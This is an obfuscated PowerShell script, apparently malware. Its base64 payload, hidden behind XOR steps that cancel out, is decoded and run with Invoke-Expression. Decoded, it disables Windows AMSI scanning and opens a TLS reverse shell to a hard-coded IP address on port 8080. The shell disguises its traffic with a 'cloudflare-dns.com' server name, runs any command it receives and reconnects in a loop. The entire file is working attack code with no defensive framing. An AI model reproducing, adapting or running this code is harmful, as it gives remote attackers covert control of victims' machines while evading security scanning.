function R1 { param($rnd) if($null -ne $rnd){ return $rnd.Next(1,101) } else { return (Get-Random -Minimum 1 -Maximum 101) } }
function R2 { param([byte[]]$x,[byte[]]$y) $z = New-Object byte[] $x.Length; for($i=0;$i -lt $x.Length;$i++){ $z[$i] = $x[$i] -bxor $y[$i % $y.Length] } ; return $z }

# 
$zutat = "JElrX3BBMkh2eVRUVkxtSDJCRks9JG51bGw7JEZVZmxnSW9VR2ZlU2g2M0N5PSJTeXN0ZW0uJChbQ2hhUl0oW2JZdGVdMHg0ZCkrW0NoQVJdKDk3KStbQ0hhcl0oMTEwKStbQ0hhUl0oOTcpK1tjaEFyXShbQllUZV0weDY3KStbY0hBcl0oW2J5VEVdMHg2NSkrW0NIQXJdKFtCWXRFXTB4NmQpK1tjaGFSXSgxMDEqMTYvMTYpK1tDSGFSXSgxMTApK1tjSEFSXSgxMTYpKS4kKCgnw4LDuXQnKyfDtW3DpCcrJ3TDrMO1JysnbicpLk5vck1hbElaZShbY0hBUl0oNDErMjkpK1tDaEFSXShbQllURV0weDZmKStbY2hBUl0oNjArNTQpK1tjaEFSXShbQnl0ZV0weDZkKStbY2hhcl0oNjgrNDctNDcpKSAtcmVwbGFjZSBbQ2hBUl0oW0J5VGVdMHg1YykrW2NIQXJdKDEwMisxMCkrW2NIQXJdKFtieXRlXTB4N2IpK1tjSGFyXShbYnl0ZV0weDRkKStbQ0hBcl0oMTEwKjQ5LzQ5KStbY0hBcl0oW0JZVGVdMHg3ZCkpLiQoW2NIQVJdKFtiWVRlXTB4NDEpK1tjaEFyXShbYll0RV0weDZkKStbY0hhUl0oW2J5dGVdMHg3MykrW2NoYVJdKDU2KzQ5KStbY2hBcl0oW0J5dEVdMHg1NSkrW0NoQXJdKFtCeXRlXTB4NzQpK1tDSEFSXSgxMDUpK1tDaGFyXSgxMDgqMjMvMjMpK1tDaGFSXSgxMTUpKSI7JG1ycXQ9IisoJ2dsw6hkZG5qw6puecO1Zmpqw65yd3InKyd5Z3jDtHp5asOpZGjDtScpLm5vck1BTEl6ZShbQ2hBcl0oW0JZdGVdMHg0NikrW0NIYXJdKDExMSsxNS0xNSkrW2NoQVJdKFtCeXRlXTB4NzIpK1tDaEFyXSgxMys5NikrW2NIYXJdKFtCeXRFXTB4NDQpKSAtcmVwbGFjZSBbY0hBcl0oW0JZdGVdMHg1YykrW2NoQVJdKDU1KzU3KStbQ2hhUl0oMTIzKStbY0hBcl0oNzcpK1tjaGFyXSgxMDcrMykrW2NoQVJdKFtCWVRlXTB4N2QpIjtbVGhyZWFkaW5nLlRocmVhZF06OlNsZWVwKDEzNik7W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgkRlVmbGdJb1VHZmVTaDYzQ3kpLkdldEZpZWxkKCQoW2NIYVJdKFtCeXRlXTB4NjEpK1tjaGFSXShbYnlUZV0weDZkKStbY0hBUl0oMTE1KzM3LTM3KStbQ0hBcl0oMTA1KStbQ2hBcl0oMzUrMzgpK1tjSGFyXShbYnlUZV0weDZlKStbY0hBcl0oMTA1KjU1LzU1KStbY0hhcl0oMTE2KzM4LTM4KStbY2hhUl0oNzArMTgtMTgpK1tDaGFSXShbQllURV0weDYxKStbQ2hhUl0oW0JZdGVdMHg2OSkrW2NIQXJdKDg1KzIzKStbQ2hBcl0oMTAxKzkxLTkxKStbY0hBcl0oW2J5VEVdMHg2NCkpLCJOb25QdWJsaWMsU3RhdGljIikuU2V0VmFsdWUoJElrX3BBMkh2eVRUVkxtSDJCRkssJHRydWUpOyR0ZWdocHN2bmY9IitbY2hhcl0oMTE0KzE1LTE1KStbY2hBUl0oNjErMzkpK1tjaGFSXShbYnlUZV0weDc5KStbY2hhUl0oNjcrNDUpK1tDaEFSXSg1MCs3MSkrW2NIQVJdKFtCeVRlXTB4NmYpK1tjaEFSXShbYll0RV0weDYyKStbQ2hBUl0oMTEwKjc1Lzc1KStbQ2hhcl0oW2J5dEVdMHg2YikrW2NIYVJdKDExNCo5Ny85NykrW0NIQXJdKDYyKzU0KStbY0hBcl0oW0J5VGVdMHg3OCkrW2NIYVJdKDEwMCozLzMpK1tDaEFSXShbYll0RV0weDczKStbQ2hBUl0oW0J5dGVdMHg3OSkrW0NoYVJdKDEwNSkrW2NoQXJdKDExNCsyMi0yMikrW2NoYVJdKDExNSkrW0NoQVJdKFtCeVRlXTB4NjEpK1tjSEFSXSgxMjErMTMtMTMpK1tjaGFyXSg5NSs2KStbQ0hBUl0oMTAxKjgxLzgxKStbY0hBcl0oMTExKzExKSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCgxOTcpDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAxICAjeXV1aHR5cGVzaGl0DQpmdW5jdGlvbiBEZWNvZGUtQmFzZTY0U3RyaW5nKCRXaWNocyl7W1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJFdpY2hzKSl9DQokRmlja3RFdXJlTXV0dGVyPURlY29kZS1CYXNlNjRTdHJpbmcgIk56Z3VOVFF1TVRBM0xqSTFNUT09Ig0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KJFd1cnN0U2FuZHdpY2g0MjA9W2ludF0oRGVjb2RlLUJhc2U2NFN0cmluZyAiT0RBNE1BPT0iKQ0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMg0KJEVzRXNFTD1bU3lzdGVtLlNlY3VyaXR5LkF1dGhlbnRpY2F0aW9uLlNzbFByb3RvY29sc106OlRsczEyDQoNCmZ1bmN0aW9uIFdyaXRlLVN0cmVhbSgkc3csJHR4dCl7JHN3LldyaXRlKCR0eHQgKyAnSHVsc2U+ICcpOyRzdy5GbHVzaCgpfQ0KDQp3aGlsZSgkdHJ1ZSl7DQogICAgdHJ5ew0KICAgICAgICAkY2xpPU5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50DQogICAgICAgICRjbGkuQ29ubmVjdCgkRmlja3RFdXJlTXV0dGVyLCRXdXJzdFNhbmR3aWNoNDIwKQ0KICAgICAgICAkbmV0U3RyZWFtPSRjbGkuR2V0U3RyZWFtKCkNCiAgICAgICAgJHNzbD1OZXctT2JqZWN0IE5ldC5TZWN1cml0eS5Tc2xTdHJlYW0oJG5ldFN0cmVhbSwkZmFsc2UsKHskdHJ1ZX0gLWFzIFtOZXQuU2VjdXJpdHkuUmVtb3RlQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2tdKSkNCiAgICAgICAgJHNzbC5BdXRoZW50aWNhdGVBc0NsaWVudCgnY2xvdWRmbGFyZS1kbnMuY29tJywkbnVsbCwkRXNFc0VMLCRmYWxzZSkNCiAgICAgICAgaWYoLW5vdCAoJHNzbC5Jc0VuY3J5cHRlZCAtYW5kICRzc2wuSXNTaWduZWQpKXsgJHNzbC5DbG9zZSgpOyRjbGkuQ2xvc2UoKTtTdGFydC1TbGVlcCA1O2NvbnRpbnVlIH0NCg0KICAgICAgICAkc3c9TmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJHNzbCkNCiAgICAgICAgJHN3LkF1dG9GbHVzaD0kdHJ1ZQ0KICAgICAgICBXcml0ZS1TdHJlYW0gJHN3ICcnDQoNCiAgICAgICAgJGJ1Zj1OZXctT2JqZWN0IEJ5dGVbXSA0MDk2DQogICAgICAgIHdoaWxlKCR0cnVlKXsNCiAgICAgICAgICAgIHRyeXsNCiAgICAgICAgICAgICAgICAkcj0kc3NsLlJlYWQoJGJ1ZiwwLCRidWYuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgIGlmKCRyIC1sZSAwKXt0aHJvdyAieCJ9DQogICAgICAgICAgICAgICAgJGNtZD0oW1RleHQuRW5jb2RpbmddOjpVVEY4KS5HZXRTdHJpbmcoJGJ1ZiwwLCRyKS5UcmltKCkNCiAgICAgICAgICAgICAgICBpZihbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkY21kKSl7V3JpdGUtU3RyZWFtICRzdyAnJztjb250aW51ZX0NCg0KICAgICAgICAgICAgICAgICMNCiAgICAgICAgICAgICAgICBpZigkY21kIC1tYXRjaCAnXlxzKmlleFxzKycpew0KICAgICAgICAgICAgICAgICAgICAkb3V0PSIuIg0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIHRyeXskb3V0PUludm9rZS1FeHByZXNzaW9uICRjbWQgMj4mMSB8IE91dC1TdHJpbmd9Y2F0Y2h7JG91dD0kXy5FeGNlcHRpb24uTWVzc2FnZX0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgV3JpdGUtU3RyZWFtICRzdyAkb3V0DQogICAgICAgICAgICB9Y2F0Y2h7YnJlYWt9DQogICAgICAgIH0NCg0KICAgICAgICAkc3cuQ2xvc2UoKQ0KICAgICAgICAkc3NsLkNsb3NlKCkNCiAgICAgICAgJG5ldFN0cmVhbS5DbG9zZSgpDQogICAgICAgICRjbGkuQ2xvc2UoKQ0KICAgIH1jYXRjaHt9DQogICAgU3RhcnQtU2xlZXAgNQ0KfQ0K"
$seed  = $null              # 

try{
    if([string]::IsNullOrEmpty($zutat)){ throw "." }
    if($zutat.Length -lt 27){ throw "Z" }

    $s1 = $zutat.Substring(0,4)
    $s2 = $zutat.Substring(4,5)
    $s3 = $zutat.Substring(9,4)
    $s4 = $zutat.Substring(13,6)
    $s5 = $zutat.Substring(19,3)
    $s6 = $zutat.Substring(22,5)
    $s7 = $zutat.Substring(27)
    $gekocht = $s1+$s2+$s3+$s4+$s5+$s6+$s7

    $b = [Text.Encoding]::UTF8.GetBytes($gekocht)

    if($null -ne $seed){ $rand = New-Object System.Random($seed); $r = R1 $rand } else { $r = R1 $null }

    $c = [string][math]::Round([math]::Pow($r,10))
    $d = [Text.Encoding]::UTF8.GetBytes($c)
    if($d.Length -eq 0){ throw "Key-Bytes leer." }
    $e = $d[($d.Length-1)..0]

    $f1 = R2 -x $b -y $d
    $f2 = R2 -x $f1 -y $e
    $g = [Text.Encoding]::UTF8.GetString($f2)

    $h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
    $i = R2 -x $h -y $d
    $j = [Text.Encoding]::UTF8.GetString($i)

    try{ $k = [Convert]::FromBase64String($j) } catch { throw "Base64-Decode fehlgeschlagen: $($_.Exception.Message)" }
    $l = [Text.Encoding]::UTF8.GetString($k)

    #
    Invoke-Expression $l

} catch {
    Write-Error "Fehler: $($_.Exception.Message)"
}
